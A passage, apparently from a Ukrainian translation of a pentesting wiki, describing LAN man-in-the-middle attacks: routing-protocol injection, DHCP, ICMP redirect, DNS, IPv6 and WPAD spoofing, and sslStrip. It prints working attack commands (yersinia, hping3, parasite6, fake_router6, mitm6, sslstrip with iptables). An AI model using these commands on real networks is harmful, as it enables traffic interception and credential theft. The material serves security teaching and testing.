–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –º–µ—Ä–µ–∂–∞ EIGRP (—ñ–Ω—à–∏–º–∏ —Å–ª–æ–≤–∞–º–∏, –∞–≤—Ç–æ–Ω–æ–º–Ω–∞ —Å–∏—Å—Ç–µ–º–∞) **—î –ø–ª–æ—Å–∫–æ—é —ñ –Ω–µ –º–∞—î —Å–µ–≥–º–µ–Ω—Ç–∞—Ü—ñ—ó –Ω–∞ –∑–æ–Ω–∏**. –Ø–∫—â–æ **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ —ñ–Ω–∂–µ–∫—Ç—É—î –º–∞—Ä—à—Ä—É—Ç**, –π–º–æ–≤—ñ—Ä–Ω–æ, —â–æ —Ü–µ–π –º–∞—Ä—à—Ä—É—Ç **–ø–æ—à–∏—Ä–∏—Ç—å—Å—è** –ø–æ –≤—Å—ñ–π –∞–≤—Ç–æ–Ω–æ–º–Ω—ñ–π —Å–∏—Å—Ç–µ–º—ñ EIGRP.

–î–ª—è –∞—Ç–∞–∫–∏ –Ω–∞ —Å–∏—Å—Ç–µ–º—É EIGRP –ø–æ—Ç—Ä—ñ–±–Ω–æ **–≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —Å—É—Å—ñ–¥—Å—Ç–≤–æ –∑ –ª–µ–≥—ñ—Ç–∏–º–Ω–∏–º –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–æ–º EIGRP**, —â–æ –≤—ñ–¥–∫—Ä–∏–≤–∞—î –±–∞–≥–∞—Ç–æ –º–æ–∂–ª–∏–≤–æ—Å—Ç–µ–π, –≤—ñ–¥ –±–∞–∑–æ–≤–æ–≥–æ —Ä–æ–∑–≤—ñ–¥–∫–∏ –¥–æ —Ä—ñ–∑–Ω–∏—Ö —ñ–Ω'—î–∫—Ü—ñ–π.

[**FRRouting**](https://frrouting.org/) –¥–æ–∑–≤–æ–ª—è—î —Ä–µ–∞–ª—ñ–∑—É–≤–∞—Ç–∏ **–≤—ñ—Ä—Ç—É–∞–ª—å–Ω–∏–π –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä, —è–∫–∏–π –ø—ñ–¥—Ç—Ä–∏–º—É—î BGP, OSPF, EIGRP, RIP —Ç–∞ —ñ–Ω—à—ñ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏.** –í—Å–µ, —â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑—Ä–æ–±–∏—Ç–∏, —Ü–µ —Ä–æ–∑–≥–æ—Ä–Ω—É—Ç–∏ –π–æ–≥–æ –Ω–∞ —Å–∏—Å—Ç–µ–º—ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞, —ñ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ –≤–∏–¥–∞–≤–∞—Ç–∏ —Å–µ–±–µ –∑–∞ –ª–µ–≥—ñ—Ç–∏–º–Ω–∏–π –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä —É –¥–æ–º–µ–Ω—ñ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—ó.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) –º–∞—î –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –¥–ª—è –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç—Ä–∞–Ω—Å–ª—è—Ü—ñ–π EIGRP (Enhanced Interior Gateway Routing Protocol). –í—ñ–Ω —Ç–∞–∫–æ–∂ –¥–æ–∑–≤–æ–ª—è—î —ñ–Ω–∂–µ–∫—Ç—É–≤–∞—Ç–∏ –ø–∞–∫–µ—Ç–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –∑–º—ñ–Ω–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—ó.

### OSPF

–£ –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ Open Shortest Path First (OSPF) **–∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è MD5 –¥–ª—è –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –±–µ–∑–ø–µ—á–Ω–æ–≥–æ —Å–ø—ñ–ª–∫—É–≤–∞–Ω–Ω—è –º—ñ–∂ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∞–º–∏**. –û–¥–Ω–∞–∫ —Ü–µ–π –∑–∞—Ö—ñ–¥ –±–µ–∑–ø–µ–∫–∏ –º–æ–∂–µ –±—É—Ç–∏ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ Loki —Ç–∞ John the Ripper. –¶—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –∑–¥–∞—Ç–Ω—ñ –∑–∞—Ö–æ–ø–ª—é–≤–∞—Ç–∏ —Ç–∞ –ª–∞–º–∞—Ç–∏ MD5 —Ö–µ—à—ñ, –≤—ñ–¥–∫—Ä–∏–≤–∞—é—á–∏ –∫–ª—é—á –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. –ü—ñ—Å–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Ü—å–æ–≥–æ –∫–ª—é—á–∞ –π–æ–≥–æ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –≤–≤–µ–¥–µ–Ω–Ω—è –Ω–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –º–∞—Ä—à—Ä—É—Ç–∏. –î–ª—è –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ –º–∞—Ä—à—Ä—É—Ç—É —Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–≥–æ –∫–ª—é—á–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –≤–∫–ª–∞–¥–∫–∏ _Injection_ —Ç–∞ _Connection_ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ.

* **–ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –ª–∞–º–∞–Ω–Ω—è MD5 —Ö–µ—à—ñ–≤:** –î–ª—è —Ü—å–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ Loki —Ç–∞ John the Ripper.
* **–ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ –º–∞—Ä—à—Ä—É—Ç—É:** –¶–µ —Ä–æ–±–∏—Ç—å—Å—è —á–µ—Ä–µ–∑ –≤–∫–ª–∞–¥–∫—É _Injection_.
* **–í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–≥–æ –∫–ª—é—á–∞:** –ö–ª—é—á –Ω–∞–ª–∞—à—Ç–æ–≤—É—î—Ç—å—Å—è —É –≤–∫–ª–∞–¥—Ü—ñ _Connection_.

### Other Generic Tools & Sources

* [**Above**](https://github.com/c4s73r/Above): –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –º–µ—Ä–µ–∂–µ–≤–æ–≥–æ —Ç—Ä–∞—Ñ—ñ–∫—É —Ç–∞ –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π
* –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –¥–µ—è–∫—É **–¥–æ–¥–∞—Ç–∫–æ–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –º–µ—Ä–µ–∂–µ–≤—ñ –∞—Ç–∞–∫–∏** [**—Ç—É—Ç**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –Ω–∞–ª–∞—à—Ç–æ–≤—É—î –≤—Å—ñ –º–µ—Ä–µ–∂–µ–≤—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ (GW, IP, DNS) –Ω–æ–≤–æ–≥–æ —á–ª–µ–Ω–∞ –º–µ—Ä–µ–∂—ñ, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ –ø—ñ–¥—Ä–æ–±–ª–µ–Ω—ñ DHCP –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [–ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —Ä–æ–∑–¥—ñ–ª](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect –ø–æ–ª—è–≥–∞—î —É –≤—ñ–¥–ø—Ä–∞–≤—Ü—ñ ICMP –ø–∞–∫–µ—Ç—É —Ç–∏–ø—É 1 –∫–æ–¥ 5, —è–∫–∏–π –≤–∫–∞–∑—É—î, —â–æ –∞—Ç–∞–∫—É—é—á–∏–π —î –Ω–∞–π–∫—Ä–∞—â–∏–º —Å–ø–æ—Å–æ–±–æ–º –¥–æ—Å—è–≥—Ç–∏ IP. –¢–æ–¥—ñ, –∫–æ–ª–∏ –∂–µ—Ä—Ç–≤–∞ —Ö–æ—á–µ –∑–≤'—è–∑–∞—Ç–∏—Å—è –∑ IP, –≤–æ–Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç—å –ø–∞–∫–µ—Ç —á–µ—Ä–µ–∑ –∞—Ç–∞–∫—É—é—á–æ–≥–æ.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–∏—Ä—ñ—à–∏—Ç—å –¥–µ—è–∫—ñ (–∞–±–æ –≤—Å—ñ) –¥–æ–º–µ–Ω–∏, —è–∫—ñ –∑–∞–ø–∏—Ç—É—î –∂–µ—Ä—Ç–≤–∞.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**–ù–∞–ª–∞—à—Ç—É–π—Ç–µ –≤–ª–∞—Å–Ω–∏–π DNS –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### –õ–æ–∫–∞–ª—å–Ω—ñ —à–ª—é–∑–∏

–ß–∞—Å—Ç–æ —ñ—Å–Ω—É—î –∫—ñ–ª—å–∫–∞ –º–∞—Ä—à—Ä—É—Ç—ñ–≤ –¥–æ —Å–∏—Å—Ç–µ–º —ñ –º–µ—Ä–µ–∂. –ü—ñ—Å–ª—è —Å–∫–ª–∞–¥–∞–Ω–Ω—è —Å–ø–∏—Å–∫—É MAC-–∞–¥—Ä–µ—Å —É –ª–æ–∫–∞–ª—å–Ω—ñ–π –º–µ—Ä–µ–∂—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ _gateway-finder.py_ –¥–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ö–æ—Å—Ç—ñ–≤, —è–∫—ñ –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å IPv4 –ø–µ—Ä–µ—Å–∏–ª–∞–Ω–Ω—è.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

–î–ª—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —Ä–æ–∑–≤'—è–∑–∞–Ω–Ω—è —Ö–æ—Å—Ç—ñ–≤, –∫–æ–ª–∏ –∑–∞–ø–∏—Ç–∏ DNS –Ω–µ —É—Å–ø—ñ—à–Ω—ñ, —Å–∏—Å—Ç–µ–º–∏ Microsoft –ø–æ–∫–ª–∞–¥–∞—é—Ç—å—Å—è –Ω–∞ **Link-Local Multicast Name Resolution (LLMNR)** —Ç–∞ **NetBIOS Name Service (NBT-NS)**. –ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ, **Apple Bonjour** —Ç–∞ **Linux zero-configuration** —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å **Multicast DNS (mDNS)** –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —Å–∏—Å—Ç–µ–º —É –º–µ—Ä–µ–∂—ñ. –ß–µ—Ä–µ–∑ –Ω–µ–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω—É –ø—Ä–∏—Ä–æ–¥—É —Ü–∏—Ö –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤ —Ç–∞ —ó—Ö —Ä–æ–±–æ—Ç—É —á–µ—Ä–µ–∑ UDP, —Ç—Ä–∞–Ω—Å–ª—é—é—á–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, —ó—Ö –º–æ–∂—É—Ç—å –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏, —è–∫—ñ –ø—Ä–∞–≥–Ω—É—Ç—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –Ω–∞ —à–∫—ñ–¥–ª–∏–≤—ñ —Å–µ—Ä–≤—ñ—Å–∏.

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–¥–∞–≤–∞—Ç–∏ —Å–µ–±–µ –∑–∞ —Å–µ—Ä–≤—ñ—Å–∏, —è–∫—ñ —à—É–∫–∞—é—Ç—å —Ö–æ—Å—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ Responder –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ —Ñ–∞–ª—å—à–∏–≤–∏—Ö –≤—ñ–¥–ø–æ–≤—ñ–¥–µ–π.\
–ß–∏—Ç–∞—Ç–∏ —Ç—É—Ç –±—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ [—è–∫ –≤–∏–¥–∞–≤–∞—Ç–∏ —Å–µ–±–µ –∑–∞ —Å–µ—Ä–≤—ñ—Å–∏ –∑ Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

–ë—Ä–∞—É–∑–µ—Ä–∏ –∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å **–ø—Ä–æ—Ç–æ–∫–æ–ª Web Proxy Auto-Discovery (WPAD) –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–≥–æ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å –ø—Ä–æ–∫—Å—ñ**. –¶–µ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏—Ö –¥–µ—Ç–∞–ª–µ–π –∑ —Å–µ—Ä–≤–µ—Ä–∞, –∑–æ–∫—Ä–µ–º–∞ —á–µ—Ä–µ–∑ URL, —Ç–∞–∫–∏–π —è–∫ "http://wpad.example.org/wpad.dat". –í–∏—è–≤–ª–µ–Ω–Ω—è —Ü—å–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ –∫–ª—ñ—î–Ω—Ç–∞–º–∏ –º–æ–∂–µ –≤—ñ–¥–±—É–≤–∞—Ç–∏—Å—è —á–µ—Ä–µ–∑ —Ä—ñ–∑–Ω—ñ –º–µ—Ö–∞–Ω—ñ–∑–º–∏:

* –ß–µ—Ä–µ–∑ **DHCP**, –¥–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è –ø–æ–ª–µ–≥—à—É—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ–≥–æ –∫–æ–¥—É 252.
* –ß–µ—Ä–µ–∑ **DNS**, —â–æ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –ø–æ—à—É–∫ —ñ–º–µ–Ω—ñ —Ö–æ—Å—Ç–∞ –∑ –ø–æ–∑–Ω–∞—á–∫–æ—é _wpad_ —É –ª–æ–∫–∞–ª—å–Ω–æ–º—É –¥–æ–º–µ–Ω—ñ.
* –ß–µ—Ä–µ–∑ **Microsoft LLMNR —Ç–∞ NBT-NS**, —è–∫—ñ —î –º–µ—Ö–∞–Ω—ñ–∑–º–∞–º–∏ —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ –∫–æ–ø—ñ—é–≤–∞–Ω–Ω—è, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è —É –≤–∏–ø–∞–¥–∫–∞—Ö, –∫–æ–ª–∏ –∑–∞–ø–∏—Ç–∏ DNS –Ω–µ —É—Å–ø—ñ—à–Ω—ñ.

–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç Responder –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ü–µ–π –ø—Ä–æ—Ç–æ–∫–æ–ª, –¥—ñ—é—á–∏ —è–∫ **—à–∫—ñ–¥–ª–∏–≤–∏–π WPAD —Å–µ—Ä–≤–µ—Ä**. –í—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î DHCP, DNS, LLMNR —Ç–∞ NBT-NS, —â–æ–± –≤–≤–µ—Å—Ç–∏ –∫–ª—ñ—î–Ω—Ç—ñ–≤ –≤ –æ–º–∞–Ω—É, –∑–º—É—à—É—é—á–∏ —ó—Ö –ø—ñ–¥–∫–ª—é—á–∞—Ç–∏—Å—è –¥–æ –Ω—å–æ–≥–æ. –©–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ —Ç–µ, —è–∫ –º–æ–∂–Ω–∞ –≤–∏–¥–∞–≤–∞—Ç–∏ —Å–µ–±–µ –∑–∞ —Å–µ—Ä–≤—ñ—Å–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ Responder, [–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

–í–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ–ø–æ–Ω—É–≤–∞—Ç–∏ —Ä—ñ–∑–Ω—ñ —Å–µ—Ä–≤—ñ—Å–∏ –≤ –º–µ—Ä–µ–∂—ñ, —â–æ–± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–æ–±–º–∞–Ω—É—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** –≤–≤–µ—Å—Ç–∏ –¥–µ—è–∫—ñ **—Ç–µ–∫—Å—Ç–æ–≤—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**. **–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ü—é –∞—Ç–∞–∫—É –≤** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

–¶—è –∞—Ç–∞–∫–∞ –¥—É–∂–µ —Å—Ö–æ–∂–∞ –Ω–∞ ARP Spoofing, –∞–ª–µ —É —Å–≤—ñ—Ç—ñ IPv6. –í–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ –∂–µ—Ä—Ç–≤—É –¥—É–º–∞—Ç–∏, —â–æ IPv6 GW –º–∞—î MAC-–∞–¥—Ä–µ—Å—É –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

–î–µ—è–∫—ñ –û–° –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –Ω–∞–ª–∞—à—Ç–æ–≤—É—é—Ç—å —à–ª—é–∑ –∑ RA –ø–∞–∫–µ—Ç—ñ–≤, –Ω–∞–¥—ñ—Å–ª–∞–Ω–∏—Ö —É –º–µ—Ä–µ–∂—ñ. –©–æ–± –æ–≥–æ–ª–æ—Å–∏—Ç–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–æ–º IPv6, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP —Å–ø—É—Ñ—ñ–Ω–≥

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –¥–µ—è–∫—ñ –û–° –Ω–∞–º–∞–≥–∞—é—Ç—å—Å—è –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ DNS, —á–∏—Ç–∞—é—á–∏ –ø–∞–∫–µ—Ç DHCPv6 –≤ –º–µ—Ä–µ–∂—ñ. –¢–æ–¥—ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –ø–∞–∫–µ—Ç DHCPv6, —â–æ–± –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —Å–µ–±–µ —è–∫ DNS. DHCP —Ç–∞–∫–æ–∂ –Ω–∞–¥–∞—î IPv6 –∂–µ—Ä—Ç–≤—ñ.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (—Ñ–µ–π–∫–æ–≤–∞ —Å—Ç–æ—Ä—ñ–Ω–∫–∞ —Ç–∞ —ñ–Ω'—î–∫—Ü—ñ—è JS –∫–æ–¥—É)

## –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç-–∞—Ç–∞–∫–∏

### sslStrip

–í –æ—Å–Ω–æ–≤–Ω–æ–º—É, —â–æ —Ä–æ–±–∏—Ç—å —Ü—è –∞—Ç–∞–∫–∞, —Ü–µ –≤ —Ä–∞–∑—ñ, —è–∫—â–æ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á** –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è **–¥–æ—Å—Ç—É–ø–∏—Ç–∏—Å—è** –¥–æ **HTTP** —Å—Ç–æ—Ä—ñ–Ω–∫–∏, —è–∫–∞ **–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î** –Ω–∞ **HTTPS** –≤–µ—Ä—Å—ñ—é. **sslStrip** –±—É–¥–µ **–ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞—Ç–∏** **HTTP –∑'—î–¥–Ω–∞–Ω–Ω—è –∑** **–∫–ª—ñ—î–Ω—Ç–æ–º** —Ç–∞ **HTTPS –∑'—î–¥–Ω–∞–Ω–Ω—è –∑** **—Å–µ—Ä–≤–µ—Ä–æ–º**, —â–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–ø–µ—Ä–µ—Ö–æ–ø–ª—é–≤–∞—Ç–∏** –∑'—î–¥–Ω–∞–Ω–Ω—è —É **–∑–≤–∏—á–∞–π–Ω–æ–º—É —Ç–µ–∫—Å—Ç—ñ**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó [—Ç—É—Ç](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ —Ç–∞ dns2proxy –¥–ª—è –æ–±—Ö–æ–¥—É HSTS

**–†—ñ–∑–Ω–∏—Ü—è** –º—ñ–∂ **sslStrip+ —Ç–∞ dns2proxy** —ñ **sslStrip** –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –≤–æ–Ω–∏ **–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—Ç–∏–º—É—Ç—å**, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, _**www.facebook.com**_ **–Ω–∞** _**wwww.facebook.com**_ (–∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É –Ω–∞ **–¥–æ–¥–∞—Ç–∫–æ–≤—É** "**w**") —ñ –≤—Å—Ç–∞–Ω–æ–≤–ª—è—Ç—å **–∞–¥—Ä–µ—Å—É —Ü—å–æ–≥–æ –¥–æ–º–µ–Ω—É —è–∫ IP-–∞–¥—Ä–µ—Å—É –∞—Ç–∞–∫—É—é—á–æ–≥–æ**. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, **–∫–ª—ñ—î–Ω—Ç** –±—É–¥–µ **–ø—ñ–¥–∫–ª—é—á–∞—Ç–∏—Å—è** –¥–æ _**wwww.facebook.com**_ **(–∞—Ç–∞–∫—É—é—á–æ–≥–æ)**, –∞–ª–µ –∑–∞ –ª–∞—à—Ç—É–Ω–∫–∞–º–∏ **sslstrip+** –±—É–¥–µ **–ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞—Ç–∏** **—Ä–µ–∞–ª—å–Ω–µ –∑'—î–¥–Ω–∞–Ω–Ω—è** —á–µ—Ä–µ–∑ https –∑ **www.facebook.com**.

